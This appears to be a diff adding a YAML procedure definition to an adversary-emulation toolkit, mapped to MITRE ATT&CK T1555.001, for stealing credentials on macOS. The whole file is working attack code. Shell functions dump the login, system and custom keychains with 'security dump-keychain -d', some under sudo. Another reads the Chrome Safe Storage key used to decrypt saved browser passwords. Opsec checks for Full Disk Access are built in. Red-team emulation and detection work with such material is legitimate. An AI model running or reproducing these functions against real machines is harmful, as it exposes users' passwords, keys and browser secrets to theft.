@@ -1,0 +1,105 @@
+procedure_name: keychains
+ttp_id: T1555.001
+tactic: Credential Access
+guid: 289b5876-2049-42fc-8b8c-0b21db32503e
+intent: Dump credentials, keys, certificates, and sensitive information from macOS
+  Keychain using security command
+author: '@darmado | https://x.com/darmad0'
+version: 1.0.4
+created: '2025-01-02'
+updated: '2025-06-03'
+procedure:
+  arguments:
+  - option: --login-keychain
+    description: Extract credentials, certificates and keys from user's login.keychain-db
+    execute_function:
+    - dump_login_keychain
+  - option: --system-keychain
+    description: Extract system-wide certificates and keys from System.keychain (requires sudo)
+    execute_function:
+    - dump_system_keychain
+  - option: --chrome-storage
+    description: Extract Chrome Safe Storage encryption key for password database decryption
+    execute_function:
+    - chrome_safe_storage
+  - option: --keychain-path
+    description: Extract credentials from custom keychain file path (requires sudo)
+    type: string
+    execute_function:
+    - dump_custom_keychain
+  - option: --all-keychains
+    description: Extract credentials from login, system keychains and Chrome storage
+    execute_function:
+    - dump_login_keychain
+    - dump_system_keychain
+    - chrome_safe_storage
+  global_variable:
+  - name: LOGIN_KEYCHAIN_PATH
+    type: string
+    default_value: /Users/$USER/Library/Keychains/login.keychain-db
+  - name: SYSTEM_KEYCHAIN_PATH
+    type: string
+    default_value: /Library/Keychains/System.keychain
+  - name: CHROME_SERVICE_NAME
+    type: string
+    default_value: Chrome Safe Storage
+  functions:
+  - name: dump_login_keychain
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: true
+        exit_on_failure: true
+    code: |
+      dump_login_keychain() {
+          local output=$(security dump-keychain "$LOGIN_KEYCHAIN_PATH" 2>&1)
+          $CMD_PRINTF "LOGIN_KEYCHAIN|%s\n" "$output"
+      }
+  - name: dump_system_keychain
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: true
+        exit_on_failure: true
+      check_permission:
+        type: directory
+        path: /Library/Keychains
+        read: true
+        write: false
+        execute: false
+        exit_on_failure: true
+    code: |
+      dump_system_keychain() {
+          local output=$(sudo security dump-keychain -d "$SYSTEM_KEYCHAIN_PATH" 2>&1)
+          $CMD_PRINTF "SYSTEM_KEYCHAIN|%s\n" "$output"
+      }
+  - name: chrome_safe_storage
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: false
+    code: |
+      chrome_safe_storage() {
+          local output=$(security find-generic-password -w -s "$CHROME_SERVICE_NAME" 2>&1)
+          $CMD_PRINTF "CHROME_STORAGE|%s\n" "$output"
+      }
+  - name: dump_custom_keychain
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: true
+        exit_on_failure: true
+    code: |
+      dump_custom_keychain() {
+          local output=$(sudo security dump-keychain -d "$KEYCHAIN_PATH_ARG" 2>&1)
+          $CMD_PRINTF "CUSTOM_KEYCHAIN|%s\n" "$output"
+      }
